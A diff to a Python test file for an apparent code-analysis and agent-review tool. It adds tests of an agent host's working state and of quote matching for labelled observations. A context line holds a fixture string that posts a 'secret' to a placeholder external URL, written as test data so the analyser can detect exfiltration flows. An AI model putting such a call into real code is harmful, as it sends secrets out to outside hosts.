@@ -235,3 +235,32 @@ def test_python_parameter_shadows_import():
         '    r.post("https://example.invalid", json=secret)\n'
     )
     assert not static_facts(package(code, "test.py")).match("ConfirmedFlow")
+
+
+def test_working_state_retains_handles_gates_and_evidence_without_notes():
+    pkg = package("private data", "collect.py")
+    host = AgentHost(pkg, static_facts(pkg))
+    initial = host.context()["working_set"]
+    assert initial["files"][0]["required_gap"] == "code:f0"
+    assert not initial["evidence"]
+    host.execute("read", {"file": "f0", "gap": "code:f0"})
+    # Intervening metadata calls must not erase read state; no remember call is needed.
+    for _ in range(3):
+        host.execute("files", {})
+    state = host.context()["working_set"]
+    assert state["evidence"][0]["source"] == "s0"
+    assert state["evidence"][0]["text"] == "private data"
+    assert state["files"][0]["read_sources"][0]["end"] == len("private data")
+    assert not host.notes
+
+
+def test_host_locates_unique_quote_but_rejects_ambiguous_quote():
+    host = AgentHost(package("你好。Hide this. Hide this. Keep silent."), FactSet())
+    host.execute("read", {"file": "f0"})
+    label = {"observation": "asks_to_conceal", "quote": "Hide this", "confidence": 0.9}
+    result = host.execute("observe", {"source": "s0", "label": label})
+    assert "exactly once" in result["data"]["error"]
+    label["quote"] = "Keep silent."
+    assert host.execute("observe", {"source": "s0", "label": label})["data"]["accepted"]
+    fact = host.facts.match("Claim")[0]
+    assert fact.span.excerpt(host.package.files[0].text) == "Keep silent."
